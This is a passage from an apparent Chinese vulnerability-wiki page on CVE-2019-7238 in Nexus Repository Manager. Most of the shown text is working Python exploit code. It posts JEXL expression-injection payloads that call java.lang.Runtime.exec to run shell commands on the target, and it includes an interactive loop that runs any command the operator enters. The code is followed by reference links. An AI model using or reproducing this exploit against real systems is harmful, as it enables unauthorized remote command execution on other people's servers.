            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">burp0_json</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">,</span>
                            <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
            <span class="n">checkSuccess</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>

            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Decode base64 command =&gt;&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
            <span class="n">burp0_url</span> <span class="o">=</span> <span class="n">remote</span> <span class="o">+</span> <span class="s2">&quot;/service/extdirect&quot;</span>
            <span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">}</span>
            <span class="n">burp0_json</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;action&quot;</span><span class="p">:</span> <span class="s2">&quot;coreui_Component&quot;</span><span class="p">,</span> <span class="s2">&quot;data&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;filter&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;repositoryName&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;*&quot;</span><span class="p">},</span> <span class="p">{</span><span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;expression&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(</span><span class="se">\&quot;</span><span class="s2">bash /tmp/passwd</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">},</span> <span class="p">{</span>
                <span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;type&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;jexl&quot;</span><span class="p">}],</span> <span class="s2">&quot;limit&quot;</span><span class="p">:</span> <span class="mi">50</span><span class="p">,</span> <span class="s2">&quot;page&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;sort&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;direction&quot;</span><span class="p">:</span> <span class="s2">&quot;ASC&quot;</span><span class="p">,</span> <span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;name&quot;</span><span class="p">}],</span> <span class="s2">&quot;start&quot;</span><span class="p">:</span> <span class="mi">0</span><span class="p">}],</span> <span class="s2">&quot;method&quot;</span><span class="p">:</span> <span class="s2">&quot;previewAssets&quot;</span><span class="p">,</span> <span class="s2">&quot;tid&quot;</span><span class="p">:</span> <span class="mi">18</span><span class="p">,</span> <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;rpc&quot;</span><span class="p">}</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">burp0_json</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">,</span>
                            <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
            <span class="n">checkSuccess</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>

            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Executing command =&gt;&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
            <span class="n">burp0_url</span> <span class="o">=</span> <span class="n">remote</span> <span class="o">+</span> <span class="s2">&quot;/service/extdirect&quot;</span>
            <span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">}</span>
            <span class="n">burp0_json</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;action&quot;</span><span class="p">:</span> <span class="s2">&quot;coreui_Component&quot;</span><span class="p">,</span> <span class="s2">&quot;data&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;filter&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;repositoryName&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;*&quot;</span><span class="p">},</span> <span class="p">{</span><span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;expression&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(</span><span class="se">\&quot;</span><span class="s2">bash pwn.txt</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">},</span> <span class="p">{</span>
                <span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;type&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;jexl&quot;</span><span class="p">}],</span> <span class="s2">&quot;limit&quot;</span><span class="p">:</span> <span class="mi">50</span><span class="p">,</span> <span class="s2">&quot;page&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;sort&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;direction&quot;</span><span class="p">:</span> <span class="s2">&quot;ASC&quot;</span><span class="p">,</span> <span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;name&quot;</span><span class="p">}],</span> <span class="s2">&quot;start&quot;</span><span class="p">:</span> <span class="mi">0</span><span class="p">}],</span> <span class="s2">&quot;method&quot;</span><span class="p">:</span> <span class="s2">&quot;previewAssets&quot;</span><span class="p">,</span> <span class="s2">&quot;tid&quot;</span><span class="p">:</span> <span class="mi">18</span><span class="p">,</span> <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;rpc&quot;</span><span class="p">}</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">burp0_json</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">,</span>
                            <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
            <span class="n">checkSuccess</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>

        <span class="k">else</span><span class="p">:</span>
            <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;command (not reflected)&gt; &quot;</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Executing command =&gt;&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
            <span class="n">burp0_url</span> <span class="o">=</span> <span class="n">remote</span> <span class="o">+</span> <span class="s2">&quot;/service/extdirect&quot;</span>
            <span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">}</span>
            <span class="n">burp0_json</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;action&quot;</span><span class="p">:</span> <span class="s2">&quot;coreui_Component&quot;</span><span class="p">,</span> <span class="s2">&quot;data&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;filter&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;repositoryName&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;*&quot;</span><span class="p">},</span> <span class="p">{</span><span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;expression&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(</span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">command</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">},</span> <span class="p">{</span>
                <span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;type&quot;</span><span class="p">,</span> <span class="s2">&quot;value&quot;</span><span class="p">:</span> <span class="s2">&quot;jexl&quot;</span><span class="p">}],</span> <span class="s2">&quot;limit&quot;</span><span class="p">:</span> <span class="mi">50</span><span class="p">,</span> <span class="s2">&quot;page&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;sort&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;direction&quot;</span><span class="p">:</span> <span class="s2">&quot;ASC&quot;</span><span class="p">,</span> <span class="s2">&quot;property&quot;</span><span class="p">:</span> <span class="s2">&quot;name&quot;</span><span class="p">}],</span> <span class="s2">&quot;start&quot;</span><span class="p">:</span> <span class="mi">0</span><span class="p">}],</span> <span class="s2">&quot;method&quot;</span><span class="p">:</span> <span class="s2">&quot;previewAssets&quot;</span><span class="p">,</span> <span class="s2">&quot;tid&quot;</span><span class="p">:</span> <span class="mi">18</span><span class="p">,</span> <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;rpc&quot;</span><span class="p">}</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">burp0_json</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">,</span>
                              <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
            <span class="n">checkSuccess</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Exiting...&quot;</span><span class="p">)</span>
        <span class="k">break</span>
</code></pre></div>

<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://xz.aliyun.com/t/4136">https://xz.aliyun.com/t/4136</a></p>
<p><a href="https://www.jianshu.com/p/34e450debe0f">https://www.jianshu.com/p/34e450debe0f</a></p>
<p><a href="https://github.com/mpgn/CVE-2019-7238">https://github.com/mpgn/CVE-2019-7238</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2020-10199%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2020-10199%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-10199）Nexus Repository Manager 远程代码执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-5475%EF%BC%89Nexus2%20yum%E6%8F%92%E4%BB%B6RCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-5475%EF%BC%89Nexus2%20yum%E6%8F%92%E4%BB%B6RCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-5475）Nexus2 yum插件RCE漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>